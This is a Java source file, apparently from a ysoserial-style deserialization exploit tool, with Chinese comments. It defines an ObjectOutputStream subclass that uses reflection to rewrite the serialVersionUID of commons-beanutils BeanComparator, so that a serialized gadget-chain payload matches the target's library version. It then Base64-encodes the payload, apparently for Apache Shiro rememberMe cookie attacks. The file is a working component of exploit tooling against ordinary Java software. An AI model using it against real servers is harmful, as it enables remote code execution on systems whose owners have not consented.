package cn.butler.yso.config;

import org.apache.shiro.lang.codec.Base64;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class SuidRewriteOutputStream extends ObjectOutputStream {
    private static final Map<String, Long> suidMap = new HashMap<>();

    static {
        // 配置你需要修改的 SUID 映射
        suidMap.put("org.apache.commons.beanutils.BeanComparator", -3490850999041592962L);
    }

    public SuidRewriteOutputStream(OutputStream out) throws IOException {
        super(out);
    }

    @Override
    protected void writeClassDescriptor(ObjectStreamClass desc) throws IOException {
        String className = desc.getName();
        if (suidMap.containsKey(className)) {
            try {
                // 使用反射强行修改 ObjectStreamClass 里的 suid 字段
                Field suidField = ObjectStreamClass.class.getDeclaredField("suid");
                suidField.setAccessible(true);
                suidField.set(desc, suidMap.get(className));
            } catch (Exception e) {
                // 如果反射失败，至少打印个错误，或者根据需求处理
                e.printStackTrace();
            }
        }
        super.writeClassDescriptor(desc);
    }

    public static String serializePayloadToBase64(Object obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        SuidRewriteOutputStream oos = new SuidRewriteOutputStream(baos);
        oos.writeObject(obj);
        oos.flush();
        byte[] bytes =  baos.toByteArray();
        return Base64.encodeToString(bytes);
    }
}
